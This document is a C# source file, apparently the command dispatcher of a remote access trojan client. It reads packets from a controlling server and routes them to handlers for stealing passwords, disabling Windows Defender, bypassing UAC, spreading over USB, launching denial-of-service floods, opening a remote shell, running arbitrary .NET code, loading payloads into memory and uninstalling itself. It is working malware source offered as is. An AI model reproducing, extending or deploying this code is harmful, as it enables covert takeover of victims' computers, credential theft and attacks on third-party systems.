using Client.Algorithm;
using Client.Helper;
using Client.MessagePack;
using Client.Connection;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Client.Handle_Packet
{
    public static class Packet
    {
        public static CancellationTokenSource ctsDos;
        public static CancellationTokenSource ctsReportWindow;
        public static string FileCopy = null;

        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "sendMessage":
                        {
                            MessageBox.Show(unpack_msgpack.ForcePathObject("Message").AsString);
                            break;
                        }

                    case "Ping":
                        {
                            Debug.WriteLine("Server Pinged me " + unpack_msgpack.ForcePathObject("Message").AsString);
                            break;
                        }

                    case "thumbnails":
                        {
                            new HandleThumbnails();
                            break;
                        }

                    case "sendFile":
                        {
                            Received();
                            new HandleSendTo().SendToDisk(unpack_msgpack);
                            break;
                        }

                    case "sendMemory":
                        {
                            Received();
                            new HandleSendTo().SendToMemory(unpack_msgpack);
                            break;
                        }

                    case "recoveryPassword":
                        {
                            Received();
                            new HandlerRecovery(unpack_msgpack);
                            break;
                        }

                    case "defender":
                        {
                            new HandleWindowsDefender();
                            break;
                        }

                    case "uac":
                        {
                            new HandleUAC();
                            break;
                        }

                    case "close":
                        {
                            Methods.ClientExit();
                            Environment.Exit(0);
                            break;
                        }

                    case "restart":
                        {
                            Process.Start(Application.ExecutablePath);
                            Methods.ClientExit();
                            Environment.Exit(0);
                            break;
                        }

                    case "uninstall":
                        {
                            new HandleUninstall();
                            break;
                        }

                    case "usb":
                        {
                            new HandleLimeUSB(unpack_msgpack);
                            break;
                        }

                    case "processManager":
                        {
                            new HandleProcessManager(unpack_msgpack);
                        }
                        break;

                    case "botKiller":
                        {
                            new HandleBotKiller().RunBotKiller();
                            break;
                        }

                    case "visitURL":
                        {
                            string url = unpack_msgpack.ForcePathObject("URL").AsString;
                            if (url.StartsWith("http"))
                            {
                                Process.Start(url);
                            }
                            break;
                        }

                    case "dos":
                        {
                            switch (unpack_msgpack.ForcePathObject("Option").AsString)
                            {
                                case "postStart":
                                    {
                                        ctsDos = new CancellationTokenSource();
                                        new HandleDos().DosPost(unpack_msgpack);
                                        break;
                                    }

                                case "postStop":
                                    {
                                        ctsDos.Cancel();
                                        break;
                                    }
                            }
                            break;
                        }

                    case "shell":
                        {
                            HandleShell.StarShell();
                            break;
                        }

                    case "shellWriteInput":
                        {
                            if (HandleShell.ProcessShell != null)
                                HandleShell.ShellWriteLine(unpack_msgpack.ForcePathObject("WriteInput").AsString);
                            break;
                        }

                    case "pcOptions":
                        {
                            new HandlePcOptions(unpack_msgpack.ForcePathObject("Option").AsString);
                            break;
                        }

                    case "reportWindow":
                        {
                            new HandleReportWindow(unpack_msgpack);
                            break;
                        }


                    case "torrent":
                        {
                            new HandleTorrent(unpack_msgpack);
                            break;
                        }

                    case "executeDotNetCode":
                        {
                            new HandlerExecuteDotNetCode(unpack_msgpack);
                            break;
                        }

                    case "blankscreen":
                        {
                            HandleBlankScreen.RunBlankScreen();
                            break;
                        }

                    case "plugin":
                        {
                            new HandlePlugin(unpack_msgpack);
                            break;
                        }

                        //case "netStat":
                        //    {
                        //        HandleNetStat.RunNetStat();
                        //        break;
                        //    }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        private static void Received()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Received";
            ClientSocket.Send(msgpack.Encode2Bytes());
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            ClientSocket.Send(msgpack.Encode2Bytes());
        }

    }
}
